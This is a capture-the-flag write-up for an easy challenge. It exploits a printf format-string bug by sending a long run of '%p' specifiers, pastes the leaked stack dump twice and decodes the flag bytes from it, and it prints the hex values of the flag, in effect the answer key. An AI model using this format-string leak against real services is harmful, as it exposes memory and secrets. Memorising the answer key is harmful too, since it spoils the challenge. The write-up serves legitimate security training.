Difficulty: EASY

Hints used: 0

AUTHOR: SYREAL

Description
Patrick and Sponge Bob were really happy with those orders you made for them, but now they're curious about the secret menu. Find it, and along the way, maybe you'll find something else of interest!

SOLUTION: 

1.Using the format specifier '%p', it allows us to read the contents if the stack at the time of the 'printf' function call. 
2. Using this input: %p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p we can a large portion of the stack. The output is as such:

Here's your order: 0x402118,(nil),0x70cc80ebfa00,(nil),0x41f880,0xa347834,0x7ffc4bf562b0,0x70cc80cb0e60,0x70cc80ed54d0,0x1,0x7ffc4bf56380,(nil),(nil),0x7b4654436f636970,0x355f31346d316e34,0x3478345f33317937,0x30355f673431665f,0x7d343663363933,0x7,0x70cc80ed78d8,0x2300000007,0x206e693374307250,0xa336c797453,0x9,0x70cc80ee8de9,0x70cc80cb9098,0x70cc80ed54d0,(nil),0x7ffc4bf56390,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x70252c70252c70,(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil)
Bye!


4. we are interested the stack contents before the buffer, which is easily visable by the repeating values. 
5. Copying Here's your order: 0x402118,(nil),0x70cc80ebfa00,(nil),0x41f880,0xa347834,0x7ffc4bf562b0,0x70cc80cb0e60,0x70cc80ed54d0,0x1,0x7ffc4bf56380,(nil),(nil),0x7b4654436f636970,0x355f31346d316e34,0x3478345f33317937,0x30355f673431665f,0x7d343663363933,0x7,0x70cc80ed78d8,0x2300000007,0x206e693374307250,0xa336c797453,0x9,0x70cc80ee8de9,0x70cc80cb9098,0x70cc80ed54d0,(nil),0x7ffc4bf56390,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x70252c70252c70,(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil)
Bye!

6. Putting all the hex values before the buffer starts in CyberChef, and using the Hex-Decoder, we can see what looks like parts of the flag among other trash hex values. 

7. Taking out the trash values we are left with five 16 hex byte strings:

0x7b4654436f636970 0x355f31346d316e34 0x3478345f33317937 0x30355f673431665f 0x7d343663363933

8. As the stack is ordered by LIFO, the hex values need to be reversed, which can be done by CyberChefs' Reverse feature
 
9. Using this, we can finnally retrieve the correct flag.

